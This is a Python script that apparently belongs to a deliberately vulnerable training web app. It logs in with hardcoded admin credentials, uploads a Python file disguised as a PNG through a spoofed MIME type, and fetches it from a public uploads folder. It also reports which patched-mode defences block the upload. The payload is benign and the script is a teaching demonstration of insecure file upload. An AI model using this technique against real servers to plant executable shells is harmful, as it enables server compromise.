import requests

BASE_URL = "http://127.0.0.1:5000"

def attack():
    print("="*60)
    print("         INSECURE FILE UPLOAD ATTACK SCRIPT         ")
    print("="*60)
    
    session = requests.Session()
    
    # 1. Log in to get an active session
    login_data = {
        'username': 'admin',
        'password': 'adminpassword'
    }
    
    print("\n[+] Logging in as admin...")
    login_resp = session.post(f"{BASE_URL}/login", data=login_data)
    
    if "Welcome" not in login_resp.text and "Dashboard" not in login_resp.text:
        print("[-] Failed to log in. Ensure admin credentials work or SQLi is active.")
        return
        
    print("[+] Logged in successfully!")
    
    # 2. Prepare the malicious payload
    # We disguise a Python script as an image by spoofing the MIME type in the HTTP headers.
    # In Vulnerable mode, the backend relies purely on this spoofed data or weak extension checks.
    payload_content = b'print("HACKED! This Python code executed on the server.")\n# Fake padding to look like an image'
    
    files = {
        'profile_pic': (
            'shell.py',               # The malicious filename
            payload_content,          # The raw bytes
            'image/png'               # Spoofed HTTP MIME type
        )
    }
    
    print("\n[+] Attempting to upload a Python script (shell.py) spoofed as a PNG...")
    upload_resp = session.post(f"{BASE_URL}/upload", files=files)
    
    if "uploaded successfully" in upload_resp.text:
        print("[+] Server blindly accepted the malicious upload!")
        
        # 3. Attempt to fetch it directly from the publicly accessible static folder
        print("\n[+] Attempting to access the uploaded script directly from the public static folder...")
        script_url = f"{BASE_URL}/static/uploads/shell.py"
        fetch_resp = session.get(script_url)
        
        if fetch_resp.status_code == 200 and "HACKED" in fetch_resp.text:
            print(f"[!] SUCCESS! The script is publicly accessible at:")
            print(f"    {script_url}")
            print("[!] If this were a real server (e.g. running PHP/Apache), navigating to this URL would execute the shell and compromise the entire machine!")
        else:
            print("[-] Could not access the file directly. (Patched mode enabled?)")
            
    else:
        print("[-] Upload failed or was rejected. (Patched mode enabled?)")
        if "magic bytes mismatch" in upload_resp.text:
            print("    [!] Patched Mode Defense: python-magic accurately analyzed the file contents and rejected the spoofed MIME type!")
        elif "Only JPG, PNG" in upload_resp.text:
            print("    [!] Patched Mode Defense: Strict extension whitelist rejected the .py file!")

if __name__ == '__main__':
    attack()
